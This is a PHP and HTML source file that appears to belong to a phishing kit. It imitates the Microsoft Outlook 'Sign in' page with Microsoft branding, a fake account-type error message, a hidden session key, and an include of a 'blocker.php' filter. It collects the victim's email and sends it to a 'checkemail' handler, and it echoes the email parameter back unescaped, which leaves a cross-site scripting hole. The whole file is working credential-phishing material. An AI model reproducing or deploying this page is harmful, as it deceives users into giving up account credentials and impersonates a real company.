<?php
include('blocker.php');
ob_start();
session_start();
  ?>
<html dir=ltr lang=en>
   <title>Sign in to Outlook</title>
   <link href=lib/img/favicon.ico rel="shortcut icon">
   <link href=lib/css/login.css rel=stylesheet>
   <body class=cb style=display:block>
      <div>
         <div>
            <div class="app background">
               <div style=background-image:url(lib/img/background.jpg)></div>
            </div>
         </div>
         <form method="GET" action="checkemail">
            <div class=outer>
               <div class="app middle">
                  <div class=background-logo-holder>
                     <img class=background-logo src=lib/img/logo3.png>
                  </div>
                  <div class="app fade-in-lightbox inner">
                     <div>
                        <img class=logo src=lib/img/logo2.svg>
                     </div>
                     <div>
                        <div>
                           <div class="animate pagination-view slide-in-next">
                              <div data-showfedcredbutton=true data-viewid=1>
                                 <div>
                                    <div class="row text-title" id=loginHeader>
                                       <div aria-level=1>Sign in</div>
                                       <div class="text-13 subtitle" aria-level=2>to continue to Outlook</div>
                                    </div>
                                 </div>
                                 <div class=row>
                                    <div aria-live=assertive></div>
                                    <?php if (isset($_GET['invalid'])) {
echo"<div class='alert alert-error col-md-24'>You can't sign in here with a personal account. Use your work or school account instead.</div>";                                    }  ?>
                                    <div class="col-md-24 form-group">
                                       <div class=placeholderContainer>

                                          <input type=email name=email class="form-control ltr_override" required value="<?php if (isset($_GET['email'])) {echo $_GET['email'];}?>" placeholder="someone@example.com ">
                                       <input type="hidden" name="acsh33nz0key" value="<?php echo $_SESSION['acsh33nz0key']; ?>">
                                       <input type="hidden" name="type" value="signed">

                                       </div>
                                    </div>
                                 </div>
                                 <div class=position-buttons>
                                    <div class=row>
                                       <div class=col-md-24>
                                          <div class="text-13 action-links">
                                             <div class=form-group>
                                                <a href="#" >Can’t access your account?</a>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <div class=row>
                                       <div class="col-xs-24 no-padding-left-right button-container">
                                       <div class=inline-block>
                                          <input type="submit" value="Next" class="btn btn-block btn-primary">
                                       </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
                  <div>
                  </div>
                  <div class=footer id=footer>
                     <div>
                        <div class="footerNode text-secondary">
                           <span>©2019 Microsoft</span> 
                           <a href="#">Terms of use</a> 
                           <a href="#">Privacy & cookies</a>
                           <a href="#">
                           <img src="lib/img/white_ellipsis.svg"> 
                    </a>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </form>

      </div>
   </body>
   </html>